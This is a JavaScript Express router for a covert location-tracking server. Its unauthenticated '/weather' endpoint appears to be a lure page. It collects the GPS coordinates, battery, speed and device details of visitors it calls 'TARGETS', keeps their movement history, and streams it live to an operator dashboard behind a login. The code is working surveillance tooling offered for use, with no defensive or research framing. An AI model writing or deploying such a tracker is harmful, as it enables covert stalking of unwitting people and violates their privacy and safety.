const express = require("express")
const router = express.Router()
const config = require("./config")

const TARGETS = {}
const HISTORY = {}
const STATS = { totalUpdates: 0, startTime: Date.now() }

router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body
    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
    }
    res.redirect("/")
})

router.route("/weather").get((req, res) => {
    res.render("weather")
}).post((req, res) => {
    const { id, lat, lng, battery, speed, accuracy } = req.body
    const now = Date.now()

    if (TARGETS[id] == null) {
        TARGETS[id] = {
            lat, lng, battery, speed, accuracy,
            firstSeen: now,
            lastSeen: now,
            updateCount: 0,
            device: req.headers["user-agent"] || "unknown"
        }
        HISTORY[id] = []
        IO.emit("user-connected", id)
    } else {
        TARGETS[id].lat = lat
        TARGETS[id].lng = lng
        TARGETS[id].lastSeen = now
        TARGETS[id].updateCount++
        if (battery) TARGETS[id].battery = battery
        if (speed) TARGETS[id].speed = speed
        if (accuracy) TARGETS[id].accuracy = accuracy
    }

    HISTORY[id].push({ lat, lng, time: now, speed, accuracy })
    if (HISTORY[id].length > 200) HISTORY[id].shift()

    STATS.totalUpdates++
    IO.emit("map-data", { id, lat, lng, battery, speed, accuracy, time: now })
    res.json({ ok: true })
})

router.use(function checkToken(req, res, next) {
    const token = req.cookies.token
    if (token != null && token === config.token) {
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})

router.route("/").get((req, res) => {
    res.render("home", { TARGETS, STATS })
})

router.route("/map").get((req, res) => {
    const { id } = req.query
    const data = TARGETS[id] ? [TARGETS[id].lat, TARGETS[id].lng] : null
    res.render("map", { data, id })
})

router.post("/api/clear", (req, res) => {
    const { id } = req.body
    if (id && TARGETS[id]) {
        delete TARGETS[id]
        delete HISTORY[id]
    }
    if (!id) {
        Object.keys(TARGETS).forEach(k => { delete TARGETS[k]; delete HISTORY[k] })
        STATS.totalUpdates = 0
    }
    res.json({ ok: true })
})

router.get("/api/stats", (req, res) => {
    const online = Object.values(TARGETS).filter(t => Date.now() - t.lastSeen < 30000).length
    res.json({ total: Object.keys(TARGETS).length, online, totalUpdates: STATS.totalUpdates, uptime: Date.now() - STATS.startTime })
})

module.exports = router
